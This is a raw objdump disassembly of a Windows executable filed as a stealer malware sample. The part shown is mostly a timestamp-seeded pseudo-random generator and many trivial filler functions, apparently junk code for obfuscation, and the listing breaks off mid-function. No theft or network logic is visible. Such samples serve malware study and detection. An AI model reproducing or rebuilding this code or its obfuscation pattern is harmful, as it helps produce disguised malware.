
malware_samples/stealer/17661a7d0c3deca24b2ef18f48d61326fadfbf0069d045b5d51f294526280c53.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	0f 31                	rdtsc
   140001002:	89 05 20 ce 0a 00    	mov    %eax,0xace20(%rip)        # 0x1400ade28
   140001008:	89 15 1e ce 0a 00    	mov    %edx,0xace1e(%rip)        # 0x1400ade2c
   14000100e:	89 05 18 ce 0a 00    	mov    %eax,0xace18(%rip)        # 0x1400ade2c
   140001014:	89 15 16 ce 0a 00    	mov    %edx,0xace16(%rip)        # 0x1400ade30
   14000101a:	83 0d 07 ce 0a 00 01 	orl    $0x1,0xace07(%rip)        # 0x1400ade28
   140001021:	c3                   	ret
   140001022:	8b 05 04 ce 0a 00    	mov    0xace04(%rip),%eax        # 0x1400ade2c
   140001028:	8b 15 02 ce 0a 00    	mov    0xace02(%rip),%edx        # 0x1400ade30
   14000102e:	89 c1                	mov    %eax,%ecx
   140001030:	c1 e1 0b             	shl    $0xb,%ecx
   140001033:	31 c8                	xor    %ecx,%eax
   140001035:	89 c1                	mov    %eax,%ecx
   140001037:	c1 e9 08             	shr    $0x8,%ecx
   14000103a:	31 c8                	xor    %ecx,%eax
   14000103c:	89 d1                	mov    %edx,%ecx
   14000103e:	c1 e9 13             	shr    $0x13,%ecx
   140001041:	31 ca                	xor    %ecx,%edx
   140001043:	89 c1                	mov    %eax,%ecx
   140001045:	31 d1                	xor    %edx,%ecx
   140001047:	89 0d df cd 0a 00    	mov    %ecx,0xacddf(%rip)        # 0x1400ade2c
   14000104d:	89 05 dd cd 0a 00    	mov    %eax,0xacddd(%rip)        # 0x1400ade30
   140001053:	69 c1 0d 66 19 00    	imul   $0x19660d,%ecx,%eax
   140001059:	c3                   	ret
   14000105a:	e8 c3 ff ff ff       	call   0x140001022
   14000105f:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
   140001064:	c3                   	ret
   140001065:	53                   	push   %rbx
   140001066:	56                   	push   %rsi
   140001067:	57                   	push   %rdi
   140001068:	41 54                	push   %r12
   14000106a:	41 55                	push   %r13
   14000106c:	48 83 ec 20          	sub    $0x20,%rsp
   140001070:	e8 e5 ff ff ff       	call   0x14000105a
   140001075:	25 ff 00 00 00       	and    $0xff,%eax
   14000107a:	6a 1f                	push   $0x1f
   14000107c:	6a 0b                	push   $0xb
   14000107e:	58                   	pop    %rax
   14000107f:	5b                   	pop    %rbx
   140001080:	48 0f af c3          	imul   %rbx,%rax
   140001084:	48 83 c4 20          	add    $0x20,%rsp
   140001088:	41 5d                	pop    %r13
   14000108a:	41 5c                	pop    %r12
   14000108c:	5f                   	pop    %rdi
   14000108d:	5e                   	pop    %rsi
   14000108e:	5b                   	pop    %rbx
   14000108f:	c3                   	ret
   140001090:	53                   	push   %rbx
   140001091:	56                   	push   %rsi
   140001092:	57                   	push   %rdi
   140001093:	41 54                	push   %r12
   140001095:	41 55                	push   %r13
   140001097:	48 83 ec 20          	sub    $0x20,%rsp
   14000109b:	6a 09                	push   $0x9
   14000109d:	6a 10                	push   $0x10
   14000109f:	6a 1d                	push   $0x1d
   1400010a1:	58                   	pop    %rax
   1400010a2:	5b                   	pop    %rbx
   1400010a3:	59                   	pop    %rcx
   1400010a4:	48 83 c4 20          	add    $0x20,%rsp
   1400010a8:	41 5d                	pop    %r13
   1400010aa:	41 5c                	pop    %r12
   1400010ac:	5f                   	pop    %rdi
   1400010ad:	5e                   	pop    %rsi
   1400010ae:	5b                   	pop    %rbx
   1400010af:	c3                   	ret
   1400010b0:	53                   	push   %rbx
   1400010b1:	56                   	push   %rsi
   1400010b2:	57                   	push   %rdi
   1400010b3:	41 54                	push   %r12
   1400010b5:	41 55                	push   %r13
   1400010b7:	48 83 ec 20          	sub    $0x20,%rsp
   1400010bb:	e8 9a ff ff ff       	call   0x14000105a
   1400010c0:	25 ff 00 00 00       	and    $0xff,%eax
   1400010c5:	b8 13 00 00 00       	mov    $0x13,%eax
   1400010ca:	bb 3d 00 00 00       	mov    $0x3d,%ebx
   1400010cf:	39 d8                	cmp    %ebx,%eax
   1400010d1:	7f 04                	jg     0x1400010d7
   1400010d3:	01 d8                	add    %ebx,%eax
   1400010d5:	eb 02                	jmp    0x1400010d9
   1400010d7:	29 d8                	sub    %ebx,%eax
   1400010d9:	48 83 c4 20          	add    $0x20,%rsp
   1400010dd:	41 5d                	pop    %r13
   1400010df:	41 5c                	pop    %r12
   1400010e1:	5f                   	pop    %rdi
   1400010e2:	5e                   	pop    %rsi
   1400010e3:	5b                   	pop    %rbx
   1400010e4:	c3                   	ret
   1400010e5:	53                   	push   %rbx
   1400010e6:	56                   	push   %rsi
   1400010e7:	57                   	push   %rdi
   1400010e8:	41 54                	push   %r12
   1400010ea:	41 55                	push   %r13
   1400010ec:	48 83 ec 20          	sub    $0x20,%rsp
   1400010f0:	48 c7 c0 20 00 00 00 	mov    $0x20,%rax
   1400010f7:	50                   	push   %rax
   1400010f8:	5b                   	pop    %rbx
   1400010f9:	48 83 c3 05          	add    $0x5,%rbx
   1400010fd:	48 83 c4 20          	add    $0x20,%rsp
   140001101:	41 5d                	pop    %r13
   140001103:	41 5c                	pop    %r12
   140001105:	5f                   	pop    %rdi
   140001106:	5e                   	pop    %rsi
   140001107:	5b                   	pop    %rbx
   140001108:	c3                   	ret
   140001109:	53                   	push   %rbx
   14000110a:	56                   	push   %rsi
   14000110b:	57                   	push   %rdi
   14000110c:	41 54                	push   %r12
   14000110e:	41 55                	push   %r13
   140001110:	48 83 ec 20          	sub    $0x20,%rsp
   140001114:	b8 09 00 00 00       	mov    $0x9,%eax
   140001119:	83 e0 01             	and    $0x1,%eax
   14000111c:	74 07                	je     0x140001125
   14000111e:	b8 34 00 00 00       	mov    $0x34,%eax
   140001123:	eb 05                	jmp    0x14000112a
   140001125:	b8 25 00 00 00       	mov    $0x25,%eax
   14000112a:	48 83 c4 20          	add    $0x20,%rsp
   14000112e:	41 5d                	pop    %r13
   140001130:	41 5c                	pop    %r12
   140001132:	5f                   	pop    %rdi
   140001133:	5e                   	pop    %rsi
   140001134:	5b                   	pop    %rbx
   140001135:	c3                   	ret
   140001136:	53                   	push   %rbx
   140001137:	56                   	push   %rsi
   140001138:	57                   	push   %rdi
   140001139:	41 54                	push   %r12
   14000113b:	41 55                	push   %r13
   14000113d:	48 83 ec 20          	sub    $0x20,%rsp
   140001141:	b8 01 00 00 00       	mov    $0x1,%eax
   140001146:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000114b:	0f af c1             	imul   %ecx,%eax
   14000114e:	ff c9                	dec    %ecx
   140001150:	75 f9                	jne    0x14000114b
   140001152:	48 83 c4 20          	add    $0x20,%rsp
   140001156:	41 5d                	pop    %r13
   140001158:	41 5c                	pop    %r12
   14000115a:	5f                   	pop    %rdi
   14000115b:	5e                   	pop    %rsi
   14000115c:	5b                   	pop    %rbx
   14000115d:	c3                   	ret
   14000115e:	53                   	push   %rbx
   14000115f:	56                   	push   %rsi
   140001160:	57                   	push   %rdi
   140001161:	41 54                	push   %r12
   140001163:	41 55                	push   %r13
   140001165:	48 83 ec 20          	sub    $0x20,%rsp
   140001169:	b8 01 00 00 00       	mov    $0x1,%eax
   14000116e:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001173:	0f af c1             	imul   %ecx,%eax
   140001176:	ff c9                	dec    %ecx
   140001178:	75 f9                	jne    0x140001173
   14000117a:	48 83 c4 20          	add    $0x20,%rsp
   14000117e:	41 5d                	pop    %r13
   140001180:	41 5c                	pop    %r12
   140001182:	5f                   	pop    %rdi
   140001183:	5e                   	pop    %rsi
   140001184:	5b                   	pop    %rbx
   140001185:	c3                   	ret
   140001186:	53                   	push   %rbx
   140001187:	56                   	push   %rsi
   140001188:	57                   	push   %rdi
   140001189:	41 54                	push   %r12
   14000118b:	41 55                	push   %r13
   14000118d:	48 83 ec 20          	sub    $0x20,%rsp
   140001191:	e8 c4 fe ff ff       	call   0x14000105a
   140001196:	25 ff 00 00 00       	and    $0xff,%eax
   14000119b:	b8 5a 00 00 00       	mov    $0x5a,%eax
   1400011a0:	bb 06 00 00 00       	mov    $0x6,%ebx
   1400011a5:	01 d8                	add    %ebx,%eax
   1400011a7:	d1 e0                	shl    $1,%eax
   1400011a9:	48 83 c4 20          	add    $0x20,%rsp
   1400011ad:	41 5d                	pop    %r13
   1400011af:	41 5c                	pop    %r12
   1400011b1:	5f                   	pop    %rdi
   1400011b2:	5e                   	pop    %rsi
   1400011b3:	5b                   	pop    %rbx
   1400011b4:	c3                   	ret
   1400011b5:	53                   	push   %rbx
   1400011b6:	56                   	push   %rsi
   1400011b7:	57                   	push   %rdi
   1400011b8:	41 54                	push   %r12
   1400011ba:	41 55                	push   %r13
   1400011bc:	48 83 ec 20          	sub    $0x20,%rsp
   1400011c0:	b8 20 00 00 00       	mov    $0x20,%eax
   1400011c5:	bb 0b 00 00 00       	mov    $0xb,%ebx
   1400011ca:	21 d8                	and    %ebx,%eax
   1400011cc:	83 cb 10             	or     $0x10,%ebx
   1400011cf:	48 83 c4 20          	add    $0x20,%rsp
   1400011d3:	41 5d                	pop    %r13
   1400011d5:	41 5c                	pop    %r12
   1400011d7:	5f                   	pop    %rdi
   1400011d8:	5e                   	pop    %rsi
   1400011d9:	5b                   	pop    %rbx
   1400011da:	c3                   	ret
   1400011db:	53                   	push   %rbx
   1400011dc:	56                   	push   %rsi
   1400011dd:	57                   	push   %rdi
   1400011de:	41 54                	push   %r12
   1400011e0:	41 55                	push   %r13
   1400011e2:	48 83 ec 20          	sub    $0x20,%rsp
   1400011e6:	e8 6f fe ff ff       	call   0x14000105a
   1400011eb:	25 ff 00 00 00       	and    $0xff,%eax
   1400011f0:	b8 5b 00 00 00       	mov    $0x5b,%eax
   1400011f5:	83 e0 01             	and    $0x1,%eax
   1400011f8:	74 07                	je     0x140001201
   1400011fa:	b8 4a 00 00 00       	mov    $0x4a,%eax
   1400011ff:	eb 05                	jmp    0x140001206
   140001201:	b8 01 00 00 00       	mov    $0x1,%eax
   140001206:	48 83 c4 20          	add    $0x20,%rsp
   14000120a:	41 5d                	pop    %r13
   14000120c:	41 5c                	pop    %r12
   14000120e:	5f                   	pop    %rdi
   14000120f:	5e                   	pop    %rsi
   140001210:	5b                   	pop    %rbx
   140001211:	c3                   	ret
   140001212:	53                   	push   %rbx
   140001213:	56                   	push   %rsi
   140001214:	57                   	push   %rdi
   140001215:	41 54                	push   %r12
   140001217:	41 55                	push   %r13
   140001219:	48 83 ec 20          	sub    $0x20,%rsp
   14000121d:	e8 38 fe ff ff       	call   0x14000105a
   140001222:	25 ff 00 00 00       	and    $0xff,%eax
   140001227:	b8 01 00 00 00       	mov    $0x1,%eax
   14000122c:	b9 03 00 00 00       	mov    $0x3,%ecx
   140001231:	d1 e0                	shl    $1,%eax
   140001233:	ff c9                	dec    %ecx
   140001235:	75 fa                	jne    0x140001231
   140001237:	48 83 c4 20          	add    $0x20,%rsp
   14000123b:	41 5d                	pop    %r13
   14000123d:	41 5c                	pop    %r12
   14000123f:	5f                   	pop    %rdi
   140001240:	5e                   	pop    %rsi
   140001241:	5b                   	pop    %rbx
   140001242:	c3                   	ret
   140001243:	53                   	push   %rbx
   140001244:	56                   	push   %rsi
   140001245:	57                   	push   %rdi
   140001246:	41 54                	push   %r12
   140001248:	41 55                	push   %r13
   14000124a:	48 83 ec 20          	sub    $0x20,%rsp
   14000124e:	31 c0                	xor    %eax,%eax
   140001250:	bb 02 00 00 00       	mov    $0x2,%ebx
   140001255:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000125a:	83 c0 01             	add    $0x1,%eax
   14000125d:	ff c9                	dec    %ecx
   14000125f:	75 f9                	jne    0x14000125a
   140001261:	ff cb                	dec    %ebx
   140001263:	75 f0                	jne    0x140001255
   140001265:	48 83 c4 20          	add    $0x20,%rsp
   140001269:	41 5d                	pop    %r13
   14000126b:	41 5c                	pop    %r12
   14000126d:	5f                   	pop    %rdi
   14000126e:	5e                   	pop    %rsi
   14000126f:	5b                   	pop    %rbx
   140001270:	c3                   	ret
   140001271:	53                   	push   %rbx
   140001272:	56                   	push   %rsi
   140001273:	57                   	push   %rdi
   140001274:	41 54                	push   %r12
   140001276:	41 55                	push   %r13
   140001278:	48 83 ec 20          	sub    $0x20,%rsp
   14000127c:	31 c0                	xor    %eax,%eax
   14000127e:	b9 03 00 00 00       	mov    $0x3,%ecx
   140001283:	83 c0 03             	add    $0x3,%eax
   140001286:	83 f8 0a             	cmp    $0xa,%eax
   140001289:	7f 04                	jg     0x14000128f
   14000128b:	ff c9                	dec    %ecx
   14000128d:	75 f4                	jne    0x140001283
   14000128f:	48 83 c4 20          	add    $0x20,%rsp
   140001293:	41 5d                	pop    %r13
   140001295:	41 5c                	pop    %r12
   140001297:	5f                   	pop    %rdi
   140001298:	5e                   	pop    %rsi
   140001299:	5b                   	pop    %rbx
   14000129a:	c3                   	ret
   14000129b:	53                   	push   %rbx
   14000129c:	56                   	push   %rsi
   14000129d:	57                   	push   %rdi
   14000129e:	41 54                	push   %r12
   1400012a0:	41 55                	push   %r13
   1400012a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400012a6:	b8 12 00 00 00       	mov    $0x12,%eax
   1400012ab:	bb 24 00 00 00       	mov    $0x24,%ebx
   1400012b0:	b9 44 00 00 00       	mov    $0x44,%ecx
   1400012b5:	01 d8                	add    %ebx,%eax
   1400012b7:	01 c1                	add    %eax,%ecx
   1400012b9:	48 83 c4 20          	add    $0x20,%rsp
   1400012bd:	41 5d                	pop    %r13
   1400012bf:	41 5c                	pop    %r12
   1400012c1:	5f                   	pop    %rdi
   1400012c2:	5e                   	pop    %rsi
   1400012c3:	5b                   	pop    %rbx
   1400012c4:	c3                   	ret
   1400012c5:	53                   	push   %rbx
   1400012c6:	56                   	push   %rsi
   1400012c7:	57                   	push   %rdi
   1400012c8:	41 54                	push   %r12
   1400012ca:	41 55                	push   %r13
   1400012cc:	48 83 ec 20          	sub    $0x20,%rsp
   1400012d0:	6a 2f                	push   $0x2f
   1400012d2:	6a 0a                	push   $0xa
   1400012d4:	58                   	pop    %rax
   1400012d5:	5b                   	pop    %rbx
   1400012d6:	48 0f af c3          	imul   %rbx,%rax
   1400012da:	48 83 c4 20          	add    $0x20,%rsp
   1400012de:	41 5d                	pop    %r13
   1400012e0:	41 5c                	pop    %r12
   1400012e2:	5f                   	pop    %rdi
   1400012e3:	5e                   	pop    %rsi
   1400012e4:	5b                   	pop    %rbx
   1400012e5:	c3                   	ret
   1400012e6:	53                   	push   %rbx
   1400012e7:	56                   	push   %rsi
   1400012e8:	57                   	push   %rdi
   1400012e9:	41 54                	push   %r12
   1400012eb:	41 55                	push   %r13
   1400012ed:	48 83 ec 20          	sub    $0x20,%rsp
   1400012f1:	e8 64 fd ff ff       	call   0x14000105a
   1400012f6:	25 ff 00 00 00       	and    $0xff,%eax
   1400012fb:	b8 37 00 00 00       	mov    $0x37,%eax
   140001300:	bb 15 00 00 00       	mov    $0x15,%ebx
   140001305:	01 d8                	add    %ebx,%eax
   140001307:	d1 e0                	shl    $1,%eax
   140001309:	48 83 c4 20          	add    $0x20,%rsp
   14000130d:	41 5d                	pop    %r13
   14000130f:	41 5c                	pop    %r12
   140001311:	5f                   	pop    %rdi
   140001312:	5e                   	pop    %rsi
   140001313:	5b                   	pop    %rbx
   140001314:	c3                   	ret
   140001315:	53                   	push   %rbx
   140001316:	56                   	push   %rsi
   140001317:	57                   	push   %rdi
   140001318:	41 54                	push   %r12
   14000131a:	41 55                	push   %r13
   14000131c:	48 83 ec 20          	sub    $0x20,%rsp
   140001320:	b8 1b 00 00 00       	mov    $0x1b,%eax
   140001325:	bb 2b 00 00 00       	mov    $0x2b,%ebx
   14000132a:	83 f8 1e             	cmp    $0x1e,%eax
   14000132d:	7c 09                	jl     0x140001338
   14000132f:	83 fb 46             	cmp    $0x46,%ebx
   140001332:	7f 09                	jg     0x14000133d
   140001334:	01 d8                	add    %ebx,%eax
   140001336:	eb 08                	jmp    0x140001340
   140001338:	83 e8 05             	sub    $0x5,%eax
   14000133b:	eb 03                	jmp    0x140001340
   14000133d:	83 c3 0a             	add    $0xa,%ebx
   140001340:	48 83 c4 20          	add    $0x20,%rsp
   140001344:	41 5d                	pop    %r13
   140001346:	41 5c                	pop    %r12
   140001348:	5f                   	pop    %rdi
   140001349:	5e                   	pop    %rsi
   14000134a:	5b                   	pop    %rbx
   14000134b:	c3                   	ret
   14000134c:	53                   	push   %rbx
   14000134d:	56                   	push   %rsi
   14000134e:	57                   	push   %rdi
   14000134f:	41 54                	push   %r12
   140001351:	41 55                	push   %r13
   140001353:	48 83 ec 20          	sub    $0x20,%rsp
   140001357:	e8 fe fc ff ff       	call   0x14000105a
   14000135c:	25 ff 00 00 00       	and    $0xff,%eax
   140001361:	b8 0e 00 00 00       	mov    $0xe,%eax
   140001366:	bb 38 00 00 00       	mov    $0x38,%ebx
   14000136b:	b9 4e 00 00 00       	mov    $0x4e,%ecx
   140001370:	01 d8                	add    %ebx,%eax
   140001372:	01 c8                	add    %ecx,%eax
   140001374:	48 83 c4 20          	add    $0x20,%rsp
   140001378:	41 5d                	pop    %r13
   14000137a:	41 5c                	pop    %r12
   14000137c:	5f                   	pop    %rdi
   14000137d:	5e                   	pop    %rsi
   14000137e:	5b                   	pop    %rbx
   14000137f:	c3                   	ret
   140001380:	53                   	push   %rbx
   140001381:	56                   	push   %rsi
   140001382:	57                   	push   %rdi
   140001383:	41 54                	push   %r12
   140001385:	41 55                	push   %r13
   140001387:	48 83 ec 20          	sub    $0x20,%rsp
   14000138b:	b8 21 00 00 00       	mov    $0x21,%eax
   140001390:	bb 24 00 00 00       	mov    $0x24,%ebx
   140001395:	01 d8                	add    %ebx,%eax
   140001397:	d1 e0                	shl    $1,%eax
   140001399:	48 83 c4 20          	add    $0x20,%rsp
   14000139d:	41 5d                	pop    %r13
   14000139f:	41 5c                	pop    %r12
   1400013a1:	5f                   	pop    %rdi
   1400013a2:	5e                   	pop    %rsi
   1400013a3:	5b                   	pop    %rbx
   1400013a4:	c3                   	ret
   1400013a5:	53                   	push   %rbx
   1400013a6:	56                   	push   %rsi
   1400013a7:	57                   	push   %rdi
   1400013a8:	41 54                	push   %r12
   1400013aa:	41 55                	push   %r13
   1400013ac:	48 83 ec 20          	sub    $0x20,%rsp
   1400013b0:	6a 07                	push   $0x7
   1400013b2:	58                   	pop    %rax
   1400013b3:	50                   	push   %rax
   1400013b4:	5b                   	pop    %rbx
   1400013b5:	48 83 c4 20          	add    $0x20,%rsp
   1400013b9:	41 5d                	pop    %r13
   1400013bb:	41 5c                	pop    %r12
   1400013bd:	5f                   	pop    %rdi
   1400013be:	5e                   	pop    %rsi
   1400013bf:	5b                   	pop    %rbx
   1400013c0:	c3                   	ret
   1400013c1:	53                   	push   %rbx
   1400013c2:	56                   	push   %rsi
   1400013c3:	57                   	push   %rdi
   1400013c4:	41 54                	push   %r12
   1400013c6:	41 55                	push   %r13
   1400013c8:	48 83 ec 20          	sub    $0x20,%rsp
   1400013cc:	b8 05 00 00 00       	mov    $0x5,%eax
   1400013d1:	83 c0 10             	add    $0x10,%eax
   1400013d4:	83 c0 04             	add    $0x4,%eax
   1400013d7:	83 c0 05             	add    $0x5,%eax
   1400013da:	48 83 c4 20          	add    $0x20,%rsp
   1400013de:	41 5d                	pop    %r13
   1400013e0:	41 5c                	pop    %r12
   1400013e2:	5f                   	pop    %rdi
   1400013e3:	5e                   	pop    %rsi
   1400013e4:	5b                   	pop    %rbx
   1400013e5:	c3                   	ret
   1400013e6:	53                   	push   %rbx
   1400013e7:	56                   	push   %rsi
   1400013e8:	57                   	push   %rdi
   1400013e9:	41 54                	push   %r12
   1400013eb:	41 55                	push   %r13
   1400013ed:	48 83 ec 20          	sub    $0x20,%rsp
   1400013f1:	48 c7 c0 01 00 00 00 	mov    $0x1,%rax
   1400013f8:	48 8d 58 01          	lea    0x1(%rax),%rbx
   1400013fc:	48 01 d8             	add    %rbx,%rax
   1400013ff:	48 83 c4 20          	add    $0x20,%rsp
   140001403:	41 5d                	pop    %r13
   140001405:	41 5c                	pop    %r12
   140001407:	5f                   	pop    %rdi
   140001408:	5e                   	pop    %rsi
   140001409:	5b                   	pop    %rbx
   14000140a:	c3                   	ret
   14000140b:	53                   	push   %rbx
   14000140c:	56                   	push   %rsi
   14000140d:	57                   	push   %rdi
   14000140e:	41 54                	push   %r12
   140001410:	41 55                	push   %r13
   140001412:	48 83 ec 20          	sub    $0x20,%rsp
   140001416:	b8 12 00 00 00       	mov    $0x12,%eax
   14000141b:	bb 2f 00 00 00       	mov    $0x2f,%ebx
   140001420:	b9 50 00 00 00       	mov    $0x50,%ecx
   140001425:	01 d8                	add    %ebx,%eax
   140001427:	01 c8                	add    %ecx,%eax
   140001429:	48 83 c4 20          	add    $0x20,%rsp
   14000142d:	41 5d                	pop    %r13
   14000142f:	41 5c                	pop    %r12
   140001431:	5f                   	pop    %rdi
   140001432:	5e                   	pop    %rsi
   140001433:	5b                   	pop    %rbx
   140001434:	c3                   	ret
   140001435:	53                   	push   %rbx
   140001436:	56                   	push   %rsi
   140001437:	57                   	push   %rdi
   140001438:	41 54                	push   %r12
   14000143a:	41 55                	push   %r13
   14000143c:	48 83 ec 20          	sub    $0x20,%rsp
   140001440:	b8 13 00 00 00       	mov    $0x13,%eax
   140001445:	bb 1f 00 00 00       	mov    $0x1f,%ebx
   14000144a:	b9 06 00 00 00       	mov    $0x6,%ecx
   14000144f:	01 d8                	add    %ebx,%eax
   140001451:	29 c1                	sub    %eax,%ecx
   140001453:	48 83 c4 20          	add    $0x20,%rsp
   140001457:	41 5d                	pop    %r13
   140001459:	41 5c                	pop    %r12
   14000145b:	5f                   	pop    %rdi
   14000145c:	5e                   	pop    %rsi
   14000145d:	5b                   	pop    %rbx
   14000145e:	c3                   	ret
   14000145f:	53                   	push   %rbx
   140001460:	56                   	push   %rsi
   140001461:	57                   	push   %rdi
   140001462:	41 54                	push   %r12
   140001464:	41 55                	push   %r13
   140001466:	48 83 ec 20          	sub    $0x20,%rsp
   14000146a:	6a 06                	push   $0x6
   14000146c:	58                   	pop    %rax
   14000146d:	50                   	push   %rax
   14000146e:	5b                   	pop    %rbx
   14000146f:	48 83 c4 20          	add    $0x20,%rsp
   140001473:	41 5d                	pop    %r13
   140001475:	41 5c                	pop    %r12
   140001477:	5f                   	pop    %rdi
   140001478:	5e                   	pop    %rsi
   140001479:	5b                   	pop    %rbx
   14000147a:	c3                   	ret
   14000147b:	53                   	push   %rbx
   14000147c:	56                   	push   %rsi
   14000147d:	57                   	push   %rdi
   14000147e:	41 54                	push   %r12
   140001480:	41 55                	push   %r13
   140001482:	48 83 ec 20          	sub    $0x20,%rsp
   140001486:	e8 cf fb ff ff       	call   0x14000105a
   14000148b:	25 ff 00 00 00       	and    $0xff,%eax
   140001490:	b8 19 00 00 00       	mov    $0x19,%eax
   140001495:	83 f8 32             	cmp    $0x32,%eax
   140001498:	7f 05                	jg     0x14000149f
   14000149a:	6b c0 02             	imul   $0x2,%eax,%eax
   14000149d:	eb 03                	jmp    0x1400014a2
   14000149f:	6b c0 03             	imul   $0x3,%eax,%eax
   1400014a2:	48 83 c4 20          	add    $0x20,%rsp
   1400014a6:	41 5d                	pop    %r13
   1400014a8:	41 5c                	pop    %r12
   1400014aa:	5f                   	pop    %rdi
   1400014ab:	5e                   	pop    %rsi
   1400014ac:	5b                   	pop    %rbx
   1400014ad:	c3                   	ret
   1400014ae:	53                   	push   %rbx
   1400014af:	56                   	push   %rsi
   1400014b0:	57                   	push   %rdi
   1400014b1:	41 54                	push   %r12
   1400014b3:	41 55                	push   %r13
   1400014b5:	48 83 ec 20          	sub    $0x20,%rsp
   1400014b9:	e8 9c fb ff ff       	call   0x14000105a
   1400014be:	25 ff 00 00 00       	and    $0xff,%eax
   1400014c3:	b8 a9 00 00 00       	mov    $0xa9,%eax
   1400014c8:	c1 c0 03             	rol    $0x3,%eax
   1400014cb:	c1 c8 02             	ror    $0x2,%eax
   1400014ce:	d1 e0                	shl    $1,%eax
   1400014d0:	48 83 c4 20          	add    $0x20,%rsp
   1400014d4:	41 5d                	pop    %r13
   1400014d6:	41 5c                	pop    %r12
   1400014d8:	5f                   	pop    %rdi
   1400014d9:	5e                   	pop    %rsi
   1400014da:	5b                   	pop    %rbx
   1400014db:	c3                   	ret
   1400014dc:	53                   	push   %rbx
   1400014dd:	56                   	push   %rsi
   1400014de:	57                   	push   %rdi
   1400014df:	41 54                	push   %r12
   1400014e1:	41 55                	push   %r13
   1400014e3:	48 83 ec 20          	sub    $0x20,%rsp
   1400014e7:	48 c7 c0 01 00 00 00 	mov    $0x1,%rax
   1400014ee:	48 8d 58 01          	lea    0x1(%rax),%rbx
   1400014f2:	48 01 d8             	add    %rbx,%rax
   1400014f5:	48 83 c4 20          	add    $0x20,%rsp
   1400014f9:	41 5d                	pop    %r13
   1400014fb:	41 5c                	pop    %r12
   1400014fd:	5f                   	pop    %rdi
   1400014fe:	5e                   	pop    %rsi
   1400014ff:	5b                   	pop    %rbx
   140001500:	c3                   	ret
   140001501:	53                   	push   %rbx
   140001502:	56                   	push   %rsi
   140001503:	57                   	push   %rdi
   140001504:	41 54                	push   %r12
   140001506:	41 55                	push   %r13
   140001508:	48 83 ec 20          	sub    $0x20,%rsp
   14000150c:	e8 49 fb ff ff       	call   0x14000105a
   140001511:	25 ff 00 00 00       	and    $0xff,%eax
   140001516:	48 c7 c0 0a 00 00 00 	mov    $0xa,%rax
   14000151d:	50                   	push   %rax
   14000151e:	5b                   	pop    %rbx
   14000151f:	48 83 c3 05          	add    $0x5,%rbx
   140001523:	48 83 c4 20          	add    $0x20,%rsp
   140001527:	41 5d                	pop    %r13
   140001529:	41 5c                	pop    %r12
   14000152b:	5f                   	pop    %rdi
   14000152c:	5e                   	pop    %rsi
   14000152d:	5b                   	pop    %rbx
   14000152e:	c3                   	ret
   14000152f:	53                   	push   %rbx
   140001530:	56                   	push   %rsi
   140001531:	57                   	push   %rdi
   140001532:	41 54                	push   %r12
   140001534:	41 55                	push   %r13
   140001536:	48 83 ec 20          	sub    $0x20,%rsp
   14000153a:	b8 31 00 00 00       	mov    $0x31,%eax
   14000153f:	bb 1c 00 00 00       	mov    $0x1c,%ebx
   140001544:	b9 18 00 00 00       	mov    $0x18,%ecx
   140001549:	01 d8                	add    %ebx,%eax
   14000154b:	29 c1                	sub    %eax,%ecx
   14000154d:	48 83 c4 20          	add    $0x20,%rsp
   140001551:	41 5d                	pop    %r13
   140001553:	41 5c                	pop    %r12
   140001555:	5f                   	pop    %rdi
   140001556:	5e                   	pop    %rsi
   140001557:	5b                   	pop    %rbx
   140001558:	c3                   	ret
   140001559:	53                   	push   %rbx
   14000155a:	56                   	push   %rsi
   14000155b:	57                   	push   %rdi
   14000155c:	41 54                	push   %r12
   14000155e:	41 55                	push   %r13
   140001560:	48 83 ec 20          	sub    $0x20,%rsp
   140001564:	b8 a6 00 00 00       	mov    $0xa6,%eax
   140001569:	d1 e0                	shl    $1,%eax
   14000156b:	d1 e8                	shr    $1,%eax
   14000156d:	83 e0 0f             	and    $0xf,%eax
   140001570:	48 83 c4 20          	add    $0x20,%rsp
   140001574:	41 5d                	pop    %r13
   140001576:	41 5c                	pop    %r12
   140001578:	5f                   	pop    %rdi
   140001579:	5e                   	pop    %rsi
   14000157a:	5b                   	pop    %rbx
   14000157b:	c3                   	ret
   14000157c:	53                   	push   %rbx
   14000157d:	56                   	push   %rsi
   14000157e:	57                   	push   %rdi
   14000157f:	41 54                	push   %r12
   140001581:	41 55                	push   %r13
   140001583:	48 83 ec 20          	sub    $0x20,%rsp
   140001587:	b8 5e 00 00 00       	mov    $0x5e,%eax
   14000158c:	6b c0 02             	imul   $0x2,%eax,%eax
   14000158f:	83 c0 13             	add    $0x13,%eax
   140001592:	83 e8 0a             	sub    $0xa,%eax
   140001595:	f7 d8                	neg    %eax
   140001597:	48 83 c4 20          	add    $0x20,%rsp
   14000159b:	41 5d                	pop    %r13
   14000159d:	41 5c                	pop    %r12
   14000159f:	5f                   	pop    %rdi
   1400015a0:	5e                   	pop    %rsi
   1400015a1:	5b                   	pop    %rbx
   1400015a2:	c3                   	ret
   1400015a3:	53                   	push   %rbx
   1400015a4:	56                   	push   %rsi
   1400015a5:	57                   	push   %rdi
   1400015a6:	41 54                	push   %r12
   1400015a8:	41 55                	push   %r13
   1400015aa:	48 83 ec 20          	sub    $0x20,%rsp
   1400015ae:	e8 a7 fa ff ff       	call   0x14000105a
   1400015b3:	25 ff 00 00 00       	and    $0xff,%eax
   1400015b8:	b8 4f 00 00 00       	mov    $0x4f,%eax
   1400015bd:	bb 2e 00 00 00       	mov    $0x2e,%ebx
   1400015c2:	83 f8 1e             	cmp    $0x1e,%eax
   1400015c5:	7c 09                	jl     0x1400015d0
   1400015c7:	83 fb 46             	cmp    $0x46,%ebx
   1400015ca:	7f 09                	jg     0x1400015d5
   1400015cc:	01 d8                	add    %ebx,%eax
   1400015ce:	eb 08                	jmp    0x1400015d8
   1400015d0:	83 e8 05             	sub    $0x5,%eax
   1400015d3:	eb 03                	jmp    0x1400015d8
   1400015d5:	83 c3 0a             	add    $0xa,%ebx
   1400015d8:	48 83 c4 20          	add    $0x20,%rsp
   1400015dc:	41 5d                	pop    %r13
   1400015de:	41 5c                	pop    %r12
   1400015e0:	5f                   	pop    %rdi
   1400015e1:	5e                   	pop    %rsi
   1400015e2:	5b                   	pop    %rbx
   1400015e3:	c3                   	ret
   1400015e4:	53                   	push   %rbx
   1400015e5:	56                   	push   %rsi
   1400015e6:	57                   	push   %rdi
